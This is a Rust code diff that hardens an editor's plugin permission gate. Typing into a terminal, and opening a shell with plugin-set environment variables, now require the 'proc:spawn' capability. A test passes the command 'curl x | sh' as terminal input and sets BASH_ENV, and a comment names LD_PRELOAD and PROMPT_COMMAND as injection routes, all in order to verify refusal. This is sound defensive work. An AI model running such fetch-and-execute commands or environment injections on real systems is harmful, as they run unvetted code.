@@ -259,17 +259,46 @@ impl CommandGate {
         Ok(())
     }
 
-    /// May the plugin open a terminal running `cmd_line`? A terminal that runs
-    /// a command is a process, so it takes the unbound `proc:spawn`. Without a
-    /// command it is the user's own shell, in front of them.
-    pub fn check_terminal(&self, cmd_line: Option<&str>) -> Result<(), String> {
-        match cmd_line {
-            Some(cmd) if !self.proc_spawn && !self.is_authority() => Err(format!(
+    /// May the plugin open a terminal running `cmd_line`, with `env` added?
+    /// A terminal that runs a command is a process, so it takes the unbound
+    /// `proc:spawn`. Without a command it is the user's own shell, in front of
+    /// them (`:project-shell`), and that needs nothing, but only as the user
+    /// would get it: with no environment of the plugin's. A variable is code
+    /// in the shell it reaches (`BASH_ENV`, `PROMPT_COMMAND`, `LD_PRELOAD`),
+    /// so `env` takes `proc:spawn` too (review, 2026-11-23).
+    pub fn check_terminal(
+        &self,
+        cmd_line: Option<&str>,
+        env: &[(String, String)],
+    ) -> Result<(), String> {
+        if self.proc_spawn || self.is_authority() {
+            return Ok(());
+        }
+        match (cmd_line, env.first()) {
+            (Some(cmd), _) => Err(format!(
                 "{}: refused to run `{cmd}` in a terminal — that needs the `proc:spawn` capability",
                 self.plugin
             )),
-            _ => Ok(()),
+            (None, Some((name, _))) => Err(format!(
+                "{}: refused to open a shell with `{name}` set — setting a shell's environment \
+                 needs the `proc:spawn` capability",
+                self.plugin
+            )),
+            (None, None) => Ok(()),
         }
+    }
+
+    /// May the plugin type into the focused terminal? Bytes into a shell are a
+    /// command it runs, in whatever terminal the user has in front of them, so
+    /// this takes `proc:spawn` as running one does (review, 2026-11-23).
+    pub fn check_terminal_input(&self) -> Result<(), String> {
+        if self.proc_spawn || self.is_authority() {
+            return Ok(());
+        }
+        Err(format!(
+            "{}: refused to type into a terminal — that needs the `proc:spawn` capability",
+            self.plugin
+        ))
     }
 }
 
@@ -438,7 +467,8 @@ impl EffectAuthorizer {
             | NativeEffect::SetOption { .. }
             | NativeEffect::SetLocalOption { .. }
             | NativeEffect::SetGlobalOption { .. }
-            | NativeEffect::SpawnTerminal { .. }) => match self.check_named(&effect) {
+            | NativeEffect::SpawnTerminal { .. }
+            | NativeEffect::TerminalInput(_)) => match self.check_named(&effect) {
                 Ok(()) => (effect, false),
                 Err(text) => {
                     // `info!`: one-shot and user-actionable, as a denied write is.
@@ -502,9 +532,10 @@ impl EffectAuthorizer {
             NativeEffect::SetOption { spec }
             | NativeEffect::SetLocalOption { spec }
             | NativeEffect::SetGlobalOption { spec } => gate.check_set_option(spec),
-            NativeEffect::SpawnTerminal { cmd_line, .. } => {
-                gate.check_terminal(cmd_line.as_deref())
+            NativeEffect::SpawnTerminal { cmd_line, env, .. } => {
+                gate.check_terminal(cmd_line.as_deref(), env)
             }
+            NativeEffect::TerminalInput(_) => gate.check_terminal_input(),
             _ => Ok(()),
         }
     }
@@ -1419,5 +1450,43 @@ mod tests {
             ..Default::default()
         };
         assert!(refused(&gated("org", &with).authorize(terminal(Some("make")))).is_none());
+    }
+
+    /// Review: a plugin with no `proc:spawn` could still run anything by
+    /// typing into a shell, or by handing a bare shell its environment.
+    #[test]
+    fn typing_into_a_terminal_or_setting_its_env_needs_proc_spawn() {
+        let shell_with = |env: Vec<(String, String)>| NativeEffect::SpawnTerminal {
+            cmd_line: None,
+            cwd: None,
+            env,
+            activate_minor: None,
+        };
+        let bash_env = vec![("BASH_ENV".to_string(), "/tmp/x".to_string())];
+        let without = gated("project", &CapabilityGrant::default());
+        let out = without.authorize(NativeEffect::TerminalInput(b"curl x | sh\r".to_vec()));
+        assert!(
+            refused(&out).is_some_and(|t| t.contains("type into a terminal")),
+            "{out:?}"
+        );
+        let out = without.authorize(shell_with(bash_env.clone()));
+        assert!(
+            refused(&out).is_some_and(|t| t.contains("`BASH_ENV`")),
+            "{out:?}"
+        );
+        assert!(
+            refused(&without.authorize(shell_with(Vec::new()))).is_none(),
+            ":project-shell"
+        );
+
+        let with = gated(
+            "claude-code",
+            &CapabilityGrant {
+                proc_spawn: true,
+                ..Default::default()
+            },
+        );
+        assert!(refused(&with.authorize(NativeEffect::TerminalInput(vec![0x1b]))).is_none());
+        assert!(refused(&with.authorize(shell_with(bash_env))).is_none());
     }
 }
